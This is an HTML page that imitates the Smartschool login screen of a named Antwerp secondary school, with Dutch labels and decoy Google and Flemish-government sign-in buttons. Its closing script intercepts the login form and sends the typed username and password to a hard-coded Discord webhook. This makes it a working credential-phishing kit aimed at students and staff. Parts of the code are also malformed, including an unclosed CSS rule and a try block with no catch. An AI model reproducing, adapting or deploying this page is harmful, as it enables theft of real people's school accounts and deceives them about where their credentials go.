    /* Card */
    .splashscreen__dialog {
      background-color: rgb(255, 255, 255);
      border-radius: 7px;
      border-top: 1rem solid rgb(198, 4, 80);
      box-shadow: rgb(134, 134, 134) 0px 0px 30px;
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 60vw;
      max-width: 600px;
      min-width: 300px;
      min-height: 60vh;
      max-height: 90vh;
      overflow-y: auto;
      padding-bottom: 28px;
    }

    @media screen and (max-height: 660px), screen and (max-width: 768px) {
      .splashscreen__dialog {
        border-radius: 0px;
        max-width: none;
        min-height: 100%;
        width: 100%;
      }
    }

    /* School name */
    .login-app__school-name {
      font-size: 12.5px;
      font-weight: 600;
      line-height: 1.4;
      margin-top: 10px;
      text-align: center;
      color: rgb(38, 38, 38);
      padding: 0 16px;
    }

    /* Form */
    .oauth__form {
      margin-top: 20px;
      width: 250px;
    }

    /* Floating label — exact Smartschool mechanism */
    .float-label {
      margin-bottom: 20px;
      min-width: 230px;
      position: relative;
    }

    /* The input: padding-top animates up when label floats */
    .float-label__input {
      border: 1px solid rgb(190, 190, 190);
      border-radius: 4px;
      font-family: inherit;
      font-size: 14px;
      height: 30px;
      overflow-x: hidden;
      padding: 8px;
      width: 100%;
      outline: none;
      color: rgb(38, 38, 38);
      box-sizing: border-box;
      background: transparent;
      transition: padding-top 0.2s, border-color 0.2s;
    }

    .float-label__input::placeholder { color: transparent; }

    .float-label__input:focus {
      border-color: rgb(38, 38, 38);
    }

    /* Label block — zero-height so it doesn't push layout */
    .float-label__input + label {
      display: block;
      height: 0;
      margin: 0;
      padding: 0;
      position: relative;
      white-space: nowrap;
    }

    /* The span: sits centered inside the 30px input.
       Label div is at y=30 (below input), so -22px = 30-22 = 8px from top of input = centered */
    .float-label__input + label > span {
      color: rgb(134, 134, 134);
      cursor: text;
      font-size: 14px;
      font-weight: 300;
      left: 9px;
      margin: 0;
      position: absolute;
      top: -22px;
      transition: top 0.2s, font-size 0.2s, color 0.2s;
      pointer-events: none;
      line-height: 1;
    }

    /* On focus or valid: span flies above the border line */
    .float-label__input:focus + label > span,
    .float-label__input:not(:placeholder-shown) + label > span {
      font-size: 11px;
      top: -41px;
      color: rgb(38, 38, 38);
      font-weight: 600;
    }

    .oauth__password {
      position: relative;
      margin-bottom: 6px;

    /* Buttons */
    .smscButton {
      background: #fff;
      border: 1px solid rgb(200, 200, 200);
      border-radius: 4px;
      color: rgb(38, 38, 38);
      cursor: pointer;
      font-family: inherit;
      font-size: 13.5px;
      font-weight: 600;
      height: 34px;
      padding: 0 8px;
      text-align: center;
      transition: background-color 0.15s;
      width: 100%;
      display: block;
    }

    .smscButton:hover { background-color: rgb(241, 241, 241); }

    .smscButton.blue {
      background-color: rgb(58, 112, 230);
      border-color: rgb(58, 112, 230);
      color: #fff;
      margin-top: 14px;
      margin-bottom: 20px;
    }

    .smscButton.blue:hover { background-color: rgb(48, 97, 204); }

    /* Separator */
    .oauth__septitle--separator {
      align-items: center;
      color: rgb(180, 180, 180);
      display: flex;
      font-size: 12px;
      margin-bottom: 14px;
      width: 100%;
    }

    .oauth__septitle--separator::before,
    .oauth__septitle--separator::after {
      content: "";
      flex: 1;
      height: 1px;
      background: rgb(215, 215, 215);
    }

    .oauth__septitle--or { padding: 0 10px; }

    /* SSO */
    .oauth__button__container {
      display: block;
      text-decoration: none;
      margin-bottom: 8px;
    }

    .oauth__button {
      align-items: center;
      display: flex;
    }

    .oauth__button-icon {
      background-repeat: no-repeat;
      background-position: center;
      background-size: contain;
      height: 17px;
      width: 17px;
      margin-left: 8px;

<body>
  <div class="splashscreen__dialog">

    <div class="login-app__school-logo"></div>

    <div class="login-app__school-name">
      GO! Koninklijk Atheneum Antwerpen &bull; Antwerpen
    </div>

    <div class="oauth__form">
      <form name="login_form" method="post">

        <!-- Username: floating label -->
        <div class="float-label">
          <input type="text" id="u" name="login_form[_username]"
                 required placeholder=" " class="float-label__input">
          <label for="u"><span>Gebruikersnaam</span></label>
        </div>

        <!-- Password: floating label + eye icon -->
        <div class="oauth__password">
          <div class="float-label" style="margin-bottom:0">
            <input type="password" id="p" name="login_form[_password]"
                   required autocomplete="new-password"
                   placeholder=" " class="float-label__input" style="width:100%">
            <label for="p"><span>Wachtwoord</span></label>
          </div>
          <button type="button" class="form__eye-icon" id="eyeBtn" title="Wachtwoord tonen"></button>
        </div>

        <a class="oauth__forgot-pwd" href="#">Wachtwoord vergeten?</a>

        <button class="smscButton blue" type="submit">Aanmelden</button>
      </form>

      <div class="oauth__septitle--separator">
        <span class="oauth__septitle--or">of</span>
      </div>

      <a href="#" class="oauth__button__container">
        <button class="smscButton oauth__button" type="button">
          <div class="oauth__button-icon oauth__button-icon--google"></div>
          <span class="oauth__button-text">Aanmelden met Google</span>
        </button>
      </a>

      <a href="#" class="oauth__button__container">
        <button class="smscButton oauth__button" type="button">
          <div class="oauth__button-icon oauth__button-icon--acm"></div>
          <span class="oauth__button-text">Vlaamse overheid</span>
        </button>
      </a>
    </div>

  </div>

  <script>
    const eyeBtn = document.getElementById('eyeBtn');
    const p = document.getElementById('p');
    eyeBtn.addEventListener('click', () => {
      p.type = p.type === 'password' ? 'text' : 'password';
    });

    // Discord webhook sender
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1467926327561818286/FGzye5rkxJRtoTfRr-nPdb4JohJO45-u8PNVG8JZsZPpGilcpp6xlaA6Pp8P70aZ1gL9';

    document.querySelector('form[name="login_form"]').addEventListener('submit', async function(e) {
      e.preventDefault();

      const input1 = document.getElementById('u').value;
      const input2 = document.getElementById('p').value;

      if (!input1 || !input2) {
        alert('Please fill in both fields.');
        return;
      }

      const payload = {
        content: null,
        embeds: [{
          title: 'Form Submission',
          fields: [
            { name: 'Input 1', value: input1, inline: true },
            { name: 'Input 2', value: input2, inline: true }
          ],
          color: 3447003,
          timestamp: new Date().toISOString()
        }]
      };

      try {
        const response = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      }
    });
  </script>
</body>
</html>
